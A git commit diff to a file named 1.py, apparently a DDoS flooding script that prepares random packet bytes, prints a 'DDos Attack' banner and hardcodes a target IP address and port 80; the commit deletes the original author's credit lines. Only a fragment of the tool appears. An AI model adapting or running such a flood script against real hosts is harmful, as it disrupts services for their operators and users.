d9d2353ca4b7729e87eb05b1f3022f25a37ba6fe
jiayou0203 <huoquan00022@163.com>
2019-06-27 16:34:45 +0800

    Update 1.py

--- 1.py
+++ 1.py
@@ -20,10 +20,7 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
+
 print
 ip ="23.224.37.202"
 port =80
